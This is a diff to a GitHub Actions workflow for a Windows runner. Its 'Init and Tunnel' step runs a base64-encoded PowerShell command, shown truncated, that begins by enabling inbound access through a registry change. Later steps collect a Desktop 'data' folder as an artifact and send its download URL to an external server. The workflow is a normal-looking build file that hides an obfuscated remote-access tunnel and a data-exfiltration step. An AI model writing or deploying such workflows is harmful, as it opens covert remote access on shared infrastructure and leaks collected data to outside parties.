@@ -20,18 +20,18 @@ jobs:
 
       # Step 3: Init and Tunnel
       - name: Init and Tunnel
+        shell: pwsh
         run: |
-          powershell -EncodedCommand IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB[...]
-        timeout-minutes: 3
+          powershell -EncodedCommand "IwAgAEUAbgBhAGIAbABlACAAaQBuAGIAbwB1AG4AZAAgAGEAYwBjAGUAcwBzAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgB..."
 
       # Step 4: List Desktop Data contents for debugging
-      - name: List Desktop Data contents (for debugging)
+      - name: List Desktop Data contents
+        shell: cmd
         run: dir "%USERPROFILE%\Desktop\data"
         continue-on-error: true
 
       # Step 5: Upload Desktop Data as artifact
       - name: Upload Desktop Data as "data" artifact
-        id: upload_data
         uses: actions/upload-artifact@v4
         with:
           name: data
@@ -39,7 +39,7 @@ jobs:
         if: always()
 
       # Step 6: Send artifact download URL to external server
-      - name: Send artifact download URL to external server (curl)
+      - name: Send artifact download URL to external server
         env:
           GITHUB_RUN_ID: ${{ github.run_id }}
           ARTIFACT_URL: https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts
